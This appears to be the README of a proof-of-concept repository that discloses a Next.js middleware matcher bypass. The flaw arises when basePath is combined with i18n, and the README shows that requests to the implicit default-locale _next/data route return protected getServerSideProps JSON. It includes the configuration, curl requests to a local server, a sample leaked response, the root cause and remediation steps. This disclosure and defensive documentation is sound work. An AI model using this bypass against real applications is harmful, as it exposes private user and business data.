# Next.js middleware matcher bypass on implicit default-locale `_next/data` routes with `basePath` + `i18n`

Minimal local reproduction for a Next.js Pages Router middleware matcher bypass involving:

- `basePath`
- `i18n`
- default locale
- Pages Router `getServerSideProps`
- framework-generated `_next/data/<BUILD_ID>/<page>.json` routes
- middleware matcher protection

This PoC demonstrates that a middleware matcher protecting a SSR page can fail to match the implicit default-locale `_next/data` route for the same page.

The issue was reported to Vercel Open Source through HackerOne and closed as duplicate of a previously reported issue.

## Affected scenario

A Next.js Pages Router application uses:

```js
module.exports = {
  basePath: '/corp',
  trailingSlash: false,
  i18n: {
    locales: ['en', 'it', 'fr'],
    defaultLocale: 'en',
    localeDetection: false,
  },
}

A SSR page is protected by middleware:

export const config = {
  matcher: [
    '/base-admin/:path*',
  ],
}

The middleware blocks unconditionally with HTTP 451.

Therefore, any request that reaches the page without returning 451 demonstrates that the middleware matcher was bypassed.

Vulnerable behavior

The following routes are blocked by middleware:

/corp/base-admin
/corp/en/base-admin
/corp/_next/data/<BUILD_ID>/en/base-admin.json
/corp/_next/data/<BUILD_ID>/it/base-admin.json

However, the implicit default-locale data route can return the SSR JSON directly:

/corp/_next/data/<BUILD_ID>/base-admin.json

Example response:

{
  "pageProps": {
    "marker": "BASE_ADMIN_PAGE",
    "secret": "BASE_ADMIN_SECRET_1777",
    "cookieSeen": "NULL",
    "locale": "en",
    "resolvedUrl": "/base-admin"
  },
  "__N_SSP": true
}
Why this matters

In real applications, getServerSideProps often returns data intended only for authenticated users, such as:

user profile data
admin dashboard data
internal business records
customer/order information
organization/account metadata
private page props

The build ID is normally discoverable from public Next.js HTML or assets, making the _next/data URL predictable.

Local reproduction

Install dependencies:

npm install

Build the app:

npm run build

Start the app:

npm run start

In another terminal, run:

npm run reproduce

or manually get the build ID:

cat .next/BUILD_ID

Then request:

curl -i "http://127.0.0.1:3011/corp/_next/data/<BUILD_ID>/base-admin.json"

Expected vulnerable signal:

HTTP/1.1 200 OK

and the response contains:

BASE_ADMIN_SECRET_1777

while the corresponding protected HTML route is blocked:

curl -i "http://127.0.0.1:3011/corp/base-admin"

Expected:

HTTP/1.1 451 Unavailable For Legal Reasons
SIMPLE_MATCHER_HIT ...
Root cause summary

The generated middleware matcher covers explicit locale-prefixed data routes, for example:

/corp/_next/data/<BUILD_ID>/en/base-admin.json
/corp/_next/data/<BUILD_ID>/it/base-admin.json

but does not cover the valid implicit default-locale route:

/corp/_next/data/<BUILD_ID>/base-admin.json

The router still resolves that URL to the protected SSR page and returns the getServerSideProps JSON.

In short:

authorization/middleware matcher evaluation happens before the implicit default-locale _next/data route is normalized to the protected page pathname.
Suggested remediation

Possible remediation areas:

Normalize implicit default-locale _next/data routes before middleware/proxy matcher evaluation.
Ensure generated middleware matcher regexes cover default-locale data routes without an explicit locale segment.
Add regression tests for:
basePath
i18n
Pages Router
getServerSideProps
middleware matcher
implicit default-locale _next/data routes
Disclosure note

This PoC is intended for local, educational, and defensive testing only.

The issue was responsibly reported to Vercel Open Source and closed as duplicate of a previously submitted report.
